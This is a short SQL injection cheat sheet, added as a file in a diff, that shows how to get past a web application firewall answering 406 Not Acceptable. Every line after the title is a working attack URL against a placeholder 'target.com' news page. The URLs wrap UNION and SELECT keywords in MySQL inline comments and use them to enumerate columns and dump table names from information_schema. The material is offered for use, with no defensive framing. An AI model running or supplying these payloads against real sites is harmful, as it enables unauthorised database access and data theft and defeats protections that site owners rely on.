@@ -1,0 +1,29 @@
+===================================
+BYPASS SQLI : 406 NOT ACCEPTABLE
+===================================
+
+HOW :
+
+target :
+http://www.target.com/news.php?&page=75&id=23
+
+->vuln ? yes
+
+->found the number of tables
+
+http://www.target.com/news.php?&page=75&id=23+order+by+8--
+
+http://www.target.com/news.php?&page=75&id=-23+union+select+1,2,3,4,5,6,7,8--
+
+-> response : 406
+
+FIX : http://www.target.com/news.php?&page=75&id=-23+/*!union*/+select+1,2,3,4,5,6,7,8--
+
+->obtain the tables names
+http://www.target.com/news.php?&page=75&id=-23+union+/*!select*/+1,2,3,group_concat%28table_name%29,5,6,7,8+from+information_schema.columns+where+table_schema=database%28%29--
+
+-> response : 406
+
+FIX : http://www.target.com/news.php?&page=75&id=-23+union+/*!select*/+1,2,3,/*!group_concat(table_name)*/,5,6,7,8+from+information_schema.columns+where+table_schema=database%28%29--
+
+source : http://www.alboraaq.com/forum/abh361529/
